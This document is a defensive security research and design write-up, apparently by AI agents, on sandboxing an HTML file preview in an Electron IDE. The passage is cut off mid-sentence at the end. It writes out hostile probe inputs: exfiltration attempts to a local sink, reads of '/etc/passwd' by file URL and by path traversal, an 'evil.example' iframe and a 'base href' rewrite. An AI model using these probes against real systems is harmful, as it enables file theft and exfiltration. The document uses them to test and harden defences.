9. The handler's served extension set is **its own**, not `IMAGE_EXTENSIONS`, which also
   decides what opens in the image viewer.

### What ships
- Preview, Source and Split on `.html`, from the existing `modeOptions` branch. No new
  `EditorMode` value.
- **Source is the default mode.** 63% of the 1,052 HTML files in 233 repositories on this
  machine render blank or nearly blank without JavaScript, and 84% contain a `<script>`.
- A plain line under the frame counting what was refused, and copy for the empty case
  saying the page builds itself with JavaScript, which does not run here.
- Zero new runtime dependencies.

### What does NOT ship, and why it is written here rather than forgotten
- **Mermaid**, which has the highest reach of anything unbuilt at 41 of 233 repositories
  and 3 files in Tortie's own docs. It gets its own phase because it changes the markdown
  preview's security posture, brings 107 packages and brings a vendored DOMPurify.
- **PDF**, at 82 files in 17 repositories. Close to free, `frame-src` and `object-src` each
  gain `gmux-asset:`, and it is IDE furniture. Later, small.
- **CSV, TSV and Quarto.** Deferred. Monaco already shows the text.
- **Jupyter notebooks.** Cut. 7 unique files across 233 repositories.
- **`.env`, `.pem`, `.key`, `id_rsa` and anything matching a credential pattern.** Never.
  There are 8 files named `id_rsa` tracked in repositories on this machine. Preview
  eligibility comes from an extension allowlist and is never inferred from content.

### Verification
**Tier 3 for the protocol handler, the CSP change and the sandbox attribute.** This is
untrusted content from cloned repositories, and it is the class the tier exists for. The
verifier is not the builder, and the evidence is a request count at a local HTTP sink and a
served-file matrix, not a reading of the handler.

**Tier 2 for the mode control, the empty state copy and the refusal count line.** They
touch one subsystem and cannot lose data. One targeted probe and one screenshot read.

The Tier 3 evidence must include:
- 0 requests at a sink from a page carrying a remote script, a remote stylesheet, a remote
  font, a tracking pixel, a nested remote iframe and a form.
- 0 requests with the header present and the count with it removed, to prove the test can
  fail.
- `REJECTED: Failed to fetch` from the app renderer after the CSP change.
- The symlink matrix from research 39 section 2.5, including the legitimate file reached
  through a symlinked root, which fails closed if only one side is resolved.
- The zero-click nested iframe from section 2.6, showing no navigation event is acted on.

**One warning that cost an earlier agent an hour.** A sandboxed preview frame cannot be
driven by the usual harness. `webContents.sendInputEvent` does not reach an out-of-process
iframe, and `WebFrameMain.executeJavaScript` throws on a frame with an opaque origin.
A verifier who plans to prove "clicking a link does X" needs a method neither of those
provides and should budget for it rather than discover it.

### What must not regress
- The markdown preview, including its plugin order and the `rehype-sanitize` schema. This
  phase does not touch `src/renderer/editor/markdown/`.
- The SVG tab, which already has Preview, Source and Split and must keep them.
- `gmux-asset:` and its image allowlist. The new scheme is separate and the old one does
  not widen.
- Research 37 section 8.1. The renderer holding the project tree and the terminal buffers
  still cannot post anywhere.
- Split, save with command S and go-to-line on every existing tab type.
- Startup time. The renderer side is a frame element, so there is no new chunk to load.
```

---

## 7. Open questions, and what is reasoned rather than measured

**The operator owns these two.**

1. **Does the framed page keep its own colours?** A page with no styling of its own renders
   as black on white inside a dark application. Leaving it alone is more truthful and looks
   worse. Injecting resolved token values looks better and misrepresents the file. Section
   5.5 recommends leaving it alone. This is a judgement and not a measurement.
2. **Is the corpus the right corpus?** The reach numbers treat all 233 repositories
   equally, including vendored clones such as `vscode`, `flutter` and `zed`. If the
   operator's own repositories are the 17 with PDFs or the 7 with Quarto, the ranking
   understates the value to the person using the application. The counts cannot settle
   that.

**Unverified, and named so nobody inherits it as settled.**

- **Nothing was built in Tortie.** Every measurement came from standalone Electron
  applications that copy Tortie's window options and the byte-identical policy. None of
  them has a React tree or an editor panel.
- **Everything ran from `file://`, not the dev server.** Under `electron-vite dev` the
  renderer is served over `http://localhost`, and no probe covered that origin.
- **The popup route under a sandbox is untested.** What is measured is that
  `target="_blank"` reaches `setWindowOpenHandler` with the true URL from an unsandboxed
  frame. The sandboxed case produced no event, because a page's own script cannot click
  anything when `allow-scripts` is absent.
- **The denial of service attempt failed at 126,006 elements.** That is not proof the
  window cannot be frozen. A CSS counter recursion, a font with pathological metrics and
  many preview tabs at once were not tried.
- **The 8,000 request flood used a handler that reads with `readFileSync`.** A real handler
  that streams and resolves symlinks will cost more per request, probably by a wide margin.
- **Case handling in the containment check was tested on one APFS volume on one machine.**
  A case-sensitive volume and a network mount were not tested.
- **The `WebContentsView` z-order claim is structural, not measured.**
  `BrowserWindow.capturePage()` does not include child views, so the screenshot that would
  have shown it could not be taken.
- **Mermaid under Tortie's policy is not established.** Part 2's run carried no CSP meta
  tag at all. Its timings and its stripped injection stand. The compatibility claim does
  not.
- **A large PDF was not measured.** The largest in the corpus is 18,966,883 bytes and the
  test used 4,258,000 bytes.
- **The `.qmd` fidelity claim rests on reading one file.** No Quarto document was rendered
  through the existing markdown pipeline.
- **The three locks were each measured separately, and the claim is not "this is safe".**
  It is that five specific attacks were tried, four failed, and the fifth is fixed by
  deleting a feature. The attack documents were written by the agents attacking their own
  design, and none of them is a browser security researcher.

---
---

# Appendix. The four investigations, kept whole

What follows is the raw evidence, in the order the agents produced it. Where it disagrees
with sections 1 to 7, sections 1 to 7 are the decision. The two places that happened are
the `__external` sentinel, which part 1 proposed and part 4 cut, and DOMPurify, which
part 3 recommended for a route that was not taken.

The file type survey is the fifth piece of evidence and lives at
`docs/research/39-file-preview-part-2.md`.

---

# Research 39. File preview, part 1. Where untrusted HTML runs

Date: 2026-08-12. Electron 43.3.0, Chromium 150.0.7871.212, measured on this machine.
Scope of this part: the execution boundary for an HTML preview. The survey of other
file types is a separate part of the same phase.

---

## 1. The answer

Render the repository HTML file **in a sandboxed iframe inside the existing renderer**,
served from a new read-only scheme `gmux-preview:` whose handler sets a strict
`Content-Security-Policy` response header on every response, and add exactly one
directive to the application policy, `frame-src gmux-preview:`.

No script from the file ever runs. No byte ever leaves the machine. The reader gets the
page's own text, its own layout, its own local stylesheets, its own local images and its
own working relative links.

The single CSP change was measured and it costs nothing. After adding
`frame-src gmux-preview:`, a `fetch()` from the application's own renderer to a live
local HTTP server still failed with `REJECTED: Failed to fetch`. The property research 37
depends on, that the renderer holding the project tree and terminal buffers cannot post
anywhere, survives intact.

The ceiling is in section 8. The short version is that a page whose content is produced
by JavaScript will render empty, and that is not a bug to fix later.

---

## 2. How this was measured

Nothing here is recalled. A probe application was built in the scratchpad at
`/private/tmp/claude-501/-Users-gdc-gmux/ecc455c7-2dc3-4598-9927-35e8f3a31c15/scratchpad/htmlprev/`
and run against the repository's own Electron 43.3.0 binary. Nothing in
`/Users/gdc/gmux/src` was written and no package was installed into the repository.

The setup has three parts.

- A local HTTP server stands in for the internet. Anything that arrives there left the
  application. Its request log is the ground truth for every network claim below.
- One untrusted page, `page.js`, is served into every variant. It carries a remote
  script, a remote stylesheet, a remote font, a CSS background image, a tracking pixel,
  a nested remote iframe, a form that posts to the remote host, and an inline script
  that runs twenty probes. The probes attempt `fetch`, `XMLHttpRequest`, `WebSocket`,
  `navigator.sendBeacon`, `window.open`, form submit, top-level navigation, cookie and
  `localStorage` writes, `fetch('file:///etc/passwd')`, an `<img>` pointed at a local
  file, and reads of `window.gmux`, `window.require`, `window.process`,
  `window.parent.gmux`, `window.parent.document` and `window.parent.location`.
- A host window that copies Tortie exactly. Same `webPreferences`
  (`contextIsolation: true`, `nodeIntegration: false`, `sandbox: false`, a preload that
  exposes a `window.gmux` bridge), same `loadFile` origin, and the byte-identical CSP
  from `src/renderer/index.html:8`.

Result files are `results.json`, `results2.json`, `results3.json`, `results4.json`,
`results5.json`, `results6.json`, `results8.json` and `results9.json` in that directory.

---

## 3. The options, side by side

`✗ leaves` means the probe page successfully reached the local HTTP server, measured by
its request log, not inferred from configuration.

| Option | Network | Reads local files | Reaches `window.gmux` | Renders local CSS | Runs page JS | App CSP change | Verdict |
|---|---|---|---|---|---|---|---|
| **1. `srcdoc` iframe, `sandbox="allow-scripts"`** | none (0 of 11) | no | no | no | no | none | Safe. Loses every stylesheet. |
| **2. iframe of `gmux-preview:`, own CSP header** | none (0 of 11) | only inside the project root | no | yes | no | `frame-src gmux-preview:` | **Recommended** |
| 3. `WebContentsView`, own session, own CSP header | none (0 of 11) | only inside the project root | no | yes | no | none | Same safety. Costs a floating view and bounds bookkeeping. |
| 4. Static render through `rehype-sanitize` | none | no | no | no | no | none | Mangles real pages. See 7.4. |
| 5. Show source only, no preview | none | no | no | no | no | none | The floor. Not what was asked for. |
| 6. `srcdoc` iframe, `sandbox="allow-scripts allow-same-origin"` | ✗ leaves (11 of 11) | ✗ read 9196 bytes of `/etc/passwd` | ✗ yes | yes | yes | large | **Never build this.** |
| 7. Any of the above with the CSP relaxed to allow remote hosts | ✗ leaves (11 of 11) | varies | varies | yes | yes | large | Rejected. Spends research 37's guarantee. |
| 8. `<webview>` tag | not tested | not tested | not tested | not tested | not tested | unknown | Rejected without testing. Electron discourages it and it gives nothing option 2 and option 3 do not. |

---

## 4. The finding that decides the design

**The iframe `sandbox` attribute does not stop the network. It never did.**

This is the belief most likely to produce a wrong design here, so it was tested directly.
A host page was given a deliberately relaxed policy so that CSP could not be the thing
doing the work, then the same untrusted page was mounted in a frame with
`sandbox="allow-scripts"`. Eleven requests reached the local server.

```
  sandbox="allow-scripts", relaxed host CSP   (variant C2)
  ---------------------------------------------------------
  remote stylesheet ......................... left the machine
  remote script ............................. left the machine, AND EXECUTED
  tracking pixel ............................ left the machine
  a second request made BY the remote script  left the machine
  nested remote iframe ...................... left the machine
  CSS background image ...................... left the machine
  remote font ............................... left the machine
  fetch() ................................... left the machine, resolved
  XMLHttpRequest ............................ left the machine
  WebSocket ................................. left the machine
  navigator.sendBeacon ...................... left the machine, returned true
```

What the sandbox attribute did stop in the same run was `document.cookie`,
`localStorage`, form submission, `window.open`, top-level navigation, and every read of
the parent frame. Those all threw `SecurityError`. That is worth having and the
recommendation keeps it. It is simply not a network control.

Under Tortie's real policy the same page in the same kind of frame produced **zero**
requests, and the console named each block. So the thing stopping exfiltration today is
the Content Security Policy and nothing else.

**The corollary is the rule to write down.** `allow-same-origin` must never appear in the
sandbox attribute of a preview frame. With `sandbox="allow-scripts allow-same-origin"`
under a relaxed policy, the child took the parent's `file://` origin, read
`window.parent.gmux` and got back `"object"`, read `window.parent.document.title` and got
back `"TortieHost"`, and read `/etc/passwd` in full. The byte count was 9196, and
`wc -c /etc/passwd` on this machine is 9196. That is the whole bridge and the whole disk,
from a file somebody cloned.

---

## 5. Option by option, with the probe answers

### 5.1 `srcdoc` iframe inside the existing renderer

A `srcdoc` frame inherits the embedding document's Content Security Policy. This was
confirmed rather than assumed. The console from the run under Tortie's real policy reads:

```
Executing inline script violates the following Content Security Policy directive
'script-src 'self''.
Loading the script 'http://127.0.0.1:PORT/remote.js' violates ... "script-src 'self'"
Loading the stylesheet ... violates ... "style-src 'self' 'unsafe-inline'"
Loading the image ... violates ... "img-src 'self' data: gmux-asset:"
Loading the font ... violates ... "font-src 'self' data:"
Framing 'http://127.0.0.1:PORT/' violates ... "default-src 'self'". Note that
  'frame-src' was not explicitly set, so 'default-src' is used as a fallback.
```

- Network. None. Zero of eleven requests. Stopped by the inherited policy, not by the sandbox.
- File system. No. `./sibling.png` resolved to a `file://` URL and Chromium answered
  `Not allowed to load local resource`. So did `../../../../../../etc/passwd`.
- The bridge. No. `window.gmux` inside the frame was `undefined`, because the preload
  does not run in subframes, and `window.parent.gmux` threw `SecurityError` because the
  frame's origin was `null`.
- Breakout. No, provided `allow-same-origin` is absent. Top navigation threw.
- CSP change. None required. `srcdoc` frames are not gated by `frame-src`.

What it costs is the whole point. `<link rel="stylesheet">` cannot resolve, because the
inherited `style-src` is `'self' 'unsafe-inline'` and a local stylesheet is neither. An
inline `<style>` block does survive, because of the existing `'unsafe-inline'`. So this
option renders a page's inline styling and drops its stylesheet files. For repository
HTML that is a large loss. A coverage report, a generated API reference and an exported
notebook all ship their CSS in a separate file.

### 5.2 iframe of a dedicated `gmux-preview:` scheme, with a per-response CSP

The document is served by `protocol.handle` from the project directory, so relative
references resolve inside the scheme and the handler answers them from disk. Every
response carries its own `Content-Security-Policy` header.

- Network. None. Zero of eleven requests, with the child's own header doing the blocking.
  The console named each one against `default-src 'none'`.
- File system. Only what the handler serves. The handler is the whole boundary here, and
  section 6 states what it has to enforce.
- The bridge. No. Origin is `null` under the sandbox attribute, and the preload does not
  run in the frame.
- Process. The frame gets **its own renderer process**. Measured, the host frame ran in
  pid 89089 and the preview frame in pid 89466. Process count went from 4 to 5 and total
  working set from 323 MB to 388 MB, so the preview costs about 65 MB. This matters
  because process isolation is the main thing option 3 was supposed to add, and option 2
  already has it.
- CSP change. One directive, `frame-src gmux-preview:`. Without it the frame does not
  load at all and Electron reports `ERR_BLOCKED_BY_CSP`, because `frame-src` currently
  falls back to `default-src 'self'`.

**The risk this option carries, stated plainly.** The child document does not inherit the
application policy. Its own header is the only thing protecting it. This was measured
both ways in the same run, under the application policy plus `frame-src`.

| Child served with | Requests that reached the server |
|---|---|
| its own `Content-Security-Policy` header | 0 |
| no header | 11, and the remote script executed |

So the header is a single point of failure, and it needs a test that fails when a future
change drops it. The cheap version of that test is a unit test over the handler's
response headers, and the honest version drives the frame against a local sink and counts
requests, which is what this research already does.

### 5.3 `WebContentsView` with its own session

Measured, this is as safe as option 2 and no safer.

- Network. Zero of eleven with a CSP header on the response. Eleven of eleven without one,
  which is the same single point of failure as option 2, so it does not improve on it.
- The bridge. `window.gmux`, `window.require` and `window.process` were all `undefined`.
- File system. `fetch('file:///etc/passwd')` was rejected and an `<img>` at a local file
  was refused with `Not allowed to load local resource`.
- Navigation. `window.top.location = <remote>` did not throw, because the view is a top
  level document. It fired `will-navigate`, which the handler prevented. A form submit
  fired the same event. `window.open` was refused by `setWindowOpenHandler`. So this
  option **requires** navigation guards that option 2 gets from the sandbox attribute.
- CSP change. None to the application policy, because the view is a separate document.
- Cost. Process count 4 to 5, working set 310 MB to 397 MB, so about 85 MB. First load
  77 ms, a second load in the same view 6 ms. Both numbers came back on close.

The reason to reject it is not safety, it is the user interface. A `WebContentsView` is
not in the React tree. It is a child view of the window's content view, so its position
has to be pushed from the main process on every panel resize, split drag, tab switch,
scroll and fill-mode toggle, and it composites above the window's own page. Tortie has
DOM overlays that would end up behind it. Options 1 and 2 are ordinary elements and have
none of that bookkeeping.

I tried to photograph the overlap and could not get a usable image, because
`BrowserWindow.capturePage()` captures the page and not the child views. The z-order
claim above is therefore taken from the API's structure and from `BrowserView`'s
long-standing behaviour, and it is **not measured here**.

### 5.4 Static render to sanitised markup

This is the option that looks cheapest and is the least honest about what the reader is
seeing. A representative page, a coverage report with a stylesheet, an inline `<style>`
block, a table, an inline SVG badge and a script, was pushed through the exact sanitiser
the markdown preview uses today. 749 bytes in.

Under the default schema the output was:

```
Coverage report                                     <- the <title> TEXT, now in the body
body{font-family:system-ui;background:#111;...}     <- the <style> TEXT, now in the body
<h1>Coverage</h1>                                   <- <header> gone, class gone
<table>...</table>                                  <- kept, all classes and widths gone
92%                                                 <- the SVG badge, reduced to its text
<img src="chart.png" alt="chart">                   <- src will not resolve
<details>...</details>                              <- kept
```

Two defects there are not cosmetic. The `<title>` and the contents of `<style>` are
emitted as body text, which is wrong on the face of it. The inline SVG is deleted, so
badges, diagrams and generated charts disappear.

Allowing `style` and `class` through fixes the appearance and creates a worse problem.
The kept `<style>` element is a real element in Tortie's own document, so
`body{background:#111}` in a checked-out file restyles the application, and
`position:fixed` lets a repository paint over the app. The markdown pipeline already
refuses `style` for exactly this reason and says so in
`src/renderer/editor/markdown/pipeline.ts`. Static rendering into the app's DOM would
have to walk that back, or scope every rule, or wrap the output in a frame, and wrapping
it in a frame is option 1.

### 5.5 Refuse, and show source only

This is the current behaviour and it stays available as the Source mode. It is not the
answer to the request.

---

## 6. Does this weaken the application policy

No, and this was measured rather than argued.

The application policy at `src/renderer/index.html:8` is unchanged in every clause that
matters. The single addition is:

```
  default-src 'self'; frame-src gmux-preview:; script-src 'self'; style-src 'self'
  'unsafe-inline'; img-src 'self' data: gmux-asset:; font-src 'self' data:;
  worker-src 'self' blob:
                ^^^^^^^^^^^^^^^^^^^^^^^^^
                the whole change
```

`frame-src` governs one thing, which is what URLs this document may put in a frame. It
grants no fetch reach, no script source and no image source. After the change, a
`fetch()` from the application renderer to the live local server returned
`REJECTED: Failed to fetch` and the server logged nothing. Research 37 section 8.1 stays
true as written.

Three alternatives to a new scheme were considered and all three are worse.

| Alternative | Why not |
|---|---|
| Reuse `gmux-asset:` for HTML | It is a narrow image channel with an extension allowlist and no project-root confinement. Widening it to serve HTML, CSS and JavaScript widens the channel the markdown preview already uses. Keep the narrow thing narrow. |
| `blob:` or `data:` iframe | Both are blocked by the current policy, measured, so both need a CSP change too, and neither resolves relative assets. |
| The `csp=""` attribute on the iframe | Measured, it blocks the frame outright with `ERR_BLOCKED_BY_CSP` while the identical frame without the attribute loads. It is CSP embedded enforcement and it requires the embedded document to opt in. It fails closed, which is safe, and it is useless when we already control the response header. |

On naming, the scheme should be `gmux-preview:` and not `tortie-preview:`. CLAUDE.md
puts the product name in user-visible copy only, and machine identifiers keep the `gmux`
prefix alongside `gmux-asset:` and the `gmux-asset` CSS and localStorage conventions.

---

## 7. The practical half. Relative assets, and what a preview should do about them

Most HTML in a repository is a page with a stylesheet, some images and some links beside
it on disk. That was tested against a real directory rather than reasoned about. Fixture
at `scratchpad/proj/`, page at `docs/index.html`, with a stylesheet in `docs/css/`, a
second one at `../shared.css`, a script at `docs/app.js`, an image in `docs/img/`, a
root-absolute image, a traversal image, a relative link and a nested relative iframe.

Serving the document at `gmux-preview://local/docs/index.html` and answering every
request by joining the path onto the project root, these are the exact requests the
handler received:

```
  document   gmux-preview://local/docs/index.html          inside root = true
  stylesheet gmux-preview://local/docs/css/style.css       inside root = true
  stylesheet gmux-preview://local/shared.css               inside root = true
  image      gmux-preview://local/docs/img/logo.png        inside root = true
  image      gmux-preview://local/absolute-from-root.png   inside root = true
  image      gmux-preview://local/etc/passwd               inside root = true
  iframe     gmux-preview://local/docs/fragment.html       inside root = true
  document   gmux-preview://local/docs/other.html          inside root = true
```

Five things follow, and together they are the reason to prefer option 2 over option 1.

1. **Relative resolution needs no rewriting.** The URL parser does it. This is the
   opposite of the markdown preview, which has to rewrite every `src` to `gmux-asset:`.
2. **Both stylesheets applied.** The `<h1>` computed to `rgb(0, 255, 0)` from
   `docs/css/style.css` and to `font-weight: 900` from `../shared.css`. That is the
   fidelity option 1 cannot reach.
3. **Path traversal above the root is impossible by URL semantics.** The page asked for
   `../../../../../../etc/passwd` and the parser clamped it to
   `gmux-preview://local/etc/passwd`, which the handler resolved to
   `<project>/etc/passwd`. It never got near `/etc`. This is not a licence to skip the
   check. Symlinks still escape, so the handler must call `realpath` and re-test
   containment, exactly as `src/main/assets/protocol.ts` already does for images.
4. **The page's own script did not run.** `window.__LOCAL_SCRIPT_RAN` was `false` and the
   console reported the block against `default-src 'none'`. A local script is untrusted
   in the same way a remote one is, and it is blocked the same way.
5. **`@import url("http://...")` inside the local stylesheet never left.** The server
   logged nothing for it, because `style-src` names the scheme and no host.

The response policy that produced all of the above is:

```
  default-src 'none';
  img-src     gmux-preview: data:;
  style-src   gmux-preview: 'unsafe-inline';
  font-src    gmux-preview: data:;
  media-src   gmux-preview:;
  frame-src   gmux-preview:;
  form-action 'none';
  base-uri    'none'
```

`base-uri 'none'` is not decoration. Without it a `<base href="https://evil/">` in the
file rewrites every relative reference on the page to a remote host in one line.

### 7.1 Links, which is the one place this design has a sharp edge

A relative link works and is pleasant. Clicking `<a href="other.html">` navigated the
frame to `gmux-preview://local/docs/other.html`, so a generated documentation site is
browsable inside the preview.

An external link is a defect unless it is handled. Clicking `<a href="https://...">`
inside the frame is blocked by the application's `frame-src`, and the measurement shows
what is left behind:

```
  frameTextAfterBlockedExternal = ""      <- the preview is now blank
```

`will-frame-navigate` did **not** fire for that navigation, because CSP refused it first,
so there is no event to intercept and no way to send the click to the system browser.
One external link and the reader's preview is an empty rectangle.

The fix that was measured and works is a sentinel rewrite in the handler. For each
`<a href>` whose scheme is `http` or `https`, the handler rewrites the value to
`gmux-preview://local/__external?u=<encoded>` before serving the bytes. Then:

```
  will-frame-navigate url=gmux-preview://local/__external?u=https%3A%2F%2Fexample.com%2Fdocs
                      isMainFrame=false
```

The event fires, the main process reads `u`, calls `shell.openExternal`, and calls
`preventDefault()` so the frame keeps showing the page. This reuses the exact policy
already in `src/main/index.ts` for terminal links and markdown links, which is that
`https:` goes to the system browser and nothing navigates the app.

Note the shape of the compromise. The handler is no longer serving the file's bytes
verbatim. It is serving them with the anchor targets rewritten. That is a small,
testable transform over one attribute, and it is the price of links that behave. It
should be one function with a unit test, not a regular expression scattered through the
handler. The measured version used a regular expression, which is fine for a probe and
is not fine for the product, because an `href` inside a comment or an attribute value
will fool it. Use a real parse.

---

## 8. The ceiling, stated before anyone builds it

Under the recommendation, the Preview mode can honestly show a repository HTML file's
text, its structure, its tables, its inline SVG, its local stylesheets, its local images,
its local fonts and its local links. It renders in about the same time as any other
frame, in its own process, and it cannot send anything anywhere.

It cannot show any of the following, and none of them are follow-up work.

| What a repository HTML file might be | What the preview shows |
|---|---|
| A generated coverage or API reference page with static markup and CSS | The page, correctly. This is the main case and it works. |
| An exported chart or diagram written as inline SVG | The chart, correctly. |
| A single-page application's `index.html`, e.g. a Vite or Next build output | An empty page, because the body is written by the bundle. |
| A page whose tables sort or filter by script | The unsorted table. The controls do nothing. |
| A page with a CDN stylesheet, e.g. a Tailwind or Bootstrap CDN build | Unstyled text. The remote stylesheet is refused. |
| A page with remote images or badges | Broken images. This is deliberate and it is the same rule the markdown preview already applies, because a badge and a tracking pixel are the same request. |
| An exported notebook that ships its own JavaScript renderer | Whatever static markup the export contains, which is often nothing. |

The preview must say which of these happened, rather than showing a blank rectangle and
letting the reader think Tortie is broken. The minimum is a line under the frame naming
what was refused, with counts, e.g. "3 remote resources and 2 scripts were not loaded".
The counts are available, because every refusal appears as a console message on the
frame's `webContents` and every refused local request passes through the handler.

The mode control should read **Preview, Source and Split**, matching markdown exactly, as
the request asked. Nothing about this design prevents that, since the frame is an
ordinary element in the panel.

One design question is left open on purpose. The framed page brings its own colours, so
an unstyled page renders as black text on white inside a dark application. Recommend
leaving it alone and giving the frame a plain surface with a visible border, because
recolouring a page misrepresents what the file says. That is a judgement, not a
measurement, and the operator should settle it.

---

## 9. What is not true, and what was not checked

- The z-order claim about `WebContentsView` painting above the window's own page is taken
  from the API's structure, not measured. The attempted screenshot failed because
  `BrowserWindow.capturePage()` does not include child views.
- The iframe first-load time was not measured cleanly. The recorded 1605 ms includes a
  1600 ms wait in the harness and should be ignored. The clean numbers are from the
  `WebContentsView` run, 77 ms for the first load and 6 ms for the second.
- The `<webview>` tag was not tested at all. It is rejected on the documentation's advice
  and on the grounds that it adds nothing over options 2 and 3.
- The sentinel rewrite was proven with a regular expression in the probe. A production
  implementation needs a real HTML parse, and that parse was not written or measured.
- Memory figures are single samples from one machine, not averages. Working set for one
  preview frame was 65 MB in the iframe run and 85 MB in the `WebContentsView` run. Treat
  them as the same order and not as a comparison between the two options.
- No library was chosen here, because the recommendation needs none. Chromium renders the
  HTML. The only new code is a protocol handler, a CSP string, an anchor rewrite and a
  frame element. This satisfies "assemble, never reimplement" more completely than any
  package would.
- Nothing was verified about how this interacts with the editor's split mode, tab
  recycling or fill mode. Those are integration questions for the phase spec.


---

# Agent 3. The libraries, and the shape a new viewer has to fit

Everything below was measured on 2026-08-12 in a throwaway Electron app that
copies Tortie's exact content security policy. Nothing here is recalled from
memory. The harness, its probes and its screenshots are in
`/private/tmp/claude-501/-Users-gdc-gmux/ecc455c7-2dc3-4598-9927-35e8f3a31c15/scratchpad/libcheck/`.
Nothing in `/Users/gdc/gmux/src` was written or staged.

Runtime under test, read from the binary rather than assumed.

| Thing | Value |
| --- | --- |
| Electron | 43.3.0 |
| Chromium | 150.0.7871.212 |
| Node in the main process | 24.18.1 |
| Policy under test | the literal string from `src/renderer/index.html:8` |

## 1. The answer, first

The HTML preview needs one new runtime dependency, and it is DOMPurify. Every
other file type on the list needs either no dependency at all or one small one.
The content security policy does not have to change for HTML, for SVG, for
notebooks or for CSV. It only has to change if you want Chromium's own PDF
viewer instead of shipping pdf.js.

| Type | Mechanism | New runtime dependency | CSP change |
| --- | --- | --- | --- |
| HTML | Sanitise, rewrite URLs, render in `<iframe sandbox srcdoc>` | dompurify 3.4.13, 0 deps, 10.9 KB gzip | none |
| SVG | Already shipped. `<img src="data:image/svg+xml,…">` in `src/renderer/editor/image/` | none | none |
| Jupyter notebook | Parse the JSON, reuse the existing markdown and Shiki stack for cells | anser 2.3.5 for ANSI output, 0 deps, 4.5 KB gzip | none |
| CSV and TSV | Parse in about 40 lines, render a plain table | none | none |
| PDF, option A | pdfjs-dist 6.2.108 rendering to a canvas | pdfjs-dist, 502 KB gzip of JS plus 2.9 MB of assets | none |
| PDF, option B | Chromium's built-in viewer through `<embed>` | none | two directives added |

The rest of this document is the evidence for each row, then the integration
shape, then the file by file change list.

## 2. The HTML case, which is the only hard one

### 2.1 What the current policy already does

The question is where untrusted content runs. I put a hostile document into
three kinds of iframe under the current policy and watched what Chromium did.
The document carried an inline script, an external script, a `meta refresh` to
a remote host, a nested remote iframe, a remote image, a local image served
over `gmux-asset:`, an inline `<style>` block and a `style` attribute.

A `srcdoc` iframe inherits the embedding document's policy. That is in the
spec, and it is what happened here.

| Attempt | Result under the current policy |
| --- | --- |
| Inline `<script>` in the frame | Blocked. "Executing inline script violates the following Content Security Policy directive 'script-src 'self''" |
| `<script src="./ext.js">` in the frame | Blocked. "Not allowed to load local resource" |
| `<img src="https://example.com/x.png">` | Blocked by `img-src`. `naturalWidth` was 0 |
| `<img src="gmux-asset://local/…">` | Loaded. `naturalWidth` was the true 120 px, and the main process logged the request |
| Inline `<style>` block | Applied. Body background computed to `rgb(1, 2, 3)` |
| `style` attribute | Applied. The heading computed to `33px` |
| `<meta http-equiv="refresh">` to a remote host | Refused |
| Nested `<iframe src="https://evil.example/">` | Blocked. `frame-src` falls back to `default-src 'self'` |
| An iframe whose `src` is a `blob:` URL | `ERR_BLOCKED_BY_CSP` |
| An iframe whose `src` is a `data:` URL | `ERR_BLOCKED_BY_CSP` |

Three consequences follow.

1. **`srcdoc` is the only iframe that works.** A `blob:` or `data:` frame is
   blocked by `frame-src` falling back to `default-src 'self'`. Using one would
   mean widening the policy, so do not use one.
2. **Scripts in repository HTML cannot run, and no code of ours has to stop
   them.** The policy stops them. A sanitiser is the second lock, not the first.
3. **Repository images already work, through the scheme the markdown preview
   built in Phase 12.** The main process saw the `gmux-asset:` request coming
   out of a frame carrying `sandbox=""`, which is an opaque origin. This is the
   single most useful measurement in this document, because it means the HTML
   preview reuses the image mechanism rather than inventing one.

Here is the shape.

```
  renderer (file:// or dev http://, CSP applies)
      |
      |  read the .html file        window.gmux.fs.readFile   (UTF-8, 5 MB cap)
      |  sanitise + rewrite         DOMPurify, in an inert document
      v
  <iframe sandbox="" srcdoc="…">    <- inherits the SAME CSP, plus an opaque origin
      |
      |  <img src="gmux-asset://local/abs/path.png">
      v
  main process protocol handler     src/main/assets/protocol.ts
      |
      v
  bytes from disk, streamed by Chromium
```

### 2.2 Why an iframe and not a shadow root

A shadow root would put the repository's CSS in the same layout viewport as the
app. A page that sets `position: fixed` would paint over Tortie's own chrome.
`src/renderer/editor/markdown/pipeline.ts` already refuses `style` for exactly
this reason, and says so. An iframe is a separate viewport, so fixed
positioning is contained inside the preview pane. That is the deciding reason,
and it is worth more than the sandbox attribute.

### 2.3 The platform sanitiser exists and is the wrong tool here

Chromium 150 ships the HTML Sanitizer API. All six entry points are present.

| API | Present |
| --- | --- |
| `Element.setHTML` | yes |
| `Element.setHTMLUnsafe` | yes |
| `Document.parseHTML` | yes |
| `Document.parseHTMLUnsafe` | yes |
| `ShadowRoot.setHTML` | yes |
| `new Sanitizer()` | yes |

It sanitises correctly. `setHTML` turned
`<p onclick="x()">hi<script>…</script><img src=x onerror=y()></p>` into
`<p>hi</p>`.

It is still the wrong tool, because its default allowlist is text only. I read
the default configuration back with `new Sanitizer().get()`. It permits 121
elements and 58 attributes. The 58 attributes are SVG and MathML presentation
attributes plus `dir`, `lang` and `title`.

| Element | In the default allowlist |
| --- | --- |
| `table` | yes |
| `svg` | yes |
| `img` | no |
| `style` | no |
| `link` | no |
| `form` | no |
| `details` | no |
| `video` | no |

Running a real document through `Document.parseHTML` gave back a heading with
its `style` attribute removed, a table, a link with its `target` removed, and
nothing else. No image. No stylesheet. A preview built on this would show a
repository's HTML report as unstyled black text with the pictures missing,
which is not a preview. You can supply a custom configuration, but at that
point you are hand-writing the allowlist that DOMPurify maintains for you, and
you inherit the job of tracking new elements. Use it later if DOMPurify ever
becomes a burden. Do not use it now.

One further reason. `setHTML` writes into a live element, so the browser starts
fetching images the moment it runs. DOMPurify parses into an inert document, so
nothing is fetched until we have rewritten the URLs and decided which ones may
load. For untrusted input that ordering matters.

### 2.4 DOMPurify, measured

| Property | Value |
| --- | --- |
| Version | 3.4.13, published 2026-08-03 |
| Licence | MPL-2.0 or Apache-2.0, dual, the package's own choice |
| Runtime dependencies | 0 |
| Repository | github.com/cure53/DOMPurify, last push 2026-08-10, 17,300 stars, 0 open issues |
| Release rhythm | 3.4.10 on 2026-06-12, 3.4.11 on 2026-06-17, 3.4.12 on 2026-07-11, 3.4.13 on 2026-08-03 |
| Ships native code or a binary | No. Plain JavaScript |
| Size, minified by esbuild | 28,935 bytes, 10,922 bytes gzipped |
| Works under the policy | Yes. `DOMPurify.isSupported` was true and it needs no eval and no network |
| Types | Ships its own, `purify.es.d.mts`. No `@types` package needed |

Zero open issues on a 17,300-star security library is unusual and it is a good
sign. This is the library the browser vendors' own bug bounty crowd attacks.

Two behaviours you must design around, both measured.

1. It drops a `src` whose scheme it does not know, so `gmux-asset:` URLs are
